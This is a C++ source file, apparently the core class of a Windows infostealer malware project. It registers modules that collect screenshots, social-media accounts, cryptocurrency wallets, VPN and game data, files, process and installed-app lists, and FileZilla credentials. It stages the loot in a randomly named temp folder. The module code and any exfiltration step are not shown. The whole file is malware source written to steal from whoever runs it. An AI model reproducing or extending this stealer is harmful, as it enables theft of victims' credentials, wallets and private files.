//
// Created by .1qxz on 06.06.2024.
//

#include "Stealer.h"
#include "impl/Screenshot.h"
#include "impl/Info.h"
#include "impl/socials/Socials.h"
#include "impl/files/Files.h"
#include "impl/Processes.h"
#include "impl/crypto/Crypto.h"
#include "impl/vpns/VPNs.h"
#include "impl/games/Games.h"
#include "impl/InstalledApps.h"
#include "impl/FileZilla.h"
#include <thread>

void Stealer::registerModules() {
    this->modules.push_back(new Screenshot());
    this->modules.push_back(new Socials());
    this->modules.push_back(new Crypto());
    this->modules.push_back(new VPNs());
    this->modules.push_back(new Games());
    this->modules.push_back(new Files());
    this->modules.push_back(new Info());
    this->modules.push_back(new Processes());
    this->modules.push_back(new InstalledApps());
    this->modules.push_back(new FileZilla());
}


Stealer::Stealer() {
    this->registerModules();

    this->root_dir = Utils::getTemp() / Utils::generateString(10);
    fs::create_directory(this->root_dir);

#if DEV
    std::string cmd = "explorer.exe " + this->root_dir.string();
    std::system(cmd.c_str());
#endif
}

void Stealer::run() {
    StealerModuleGroup::execute(this->root_dir);
}

void Stealer::complete() {

}
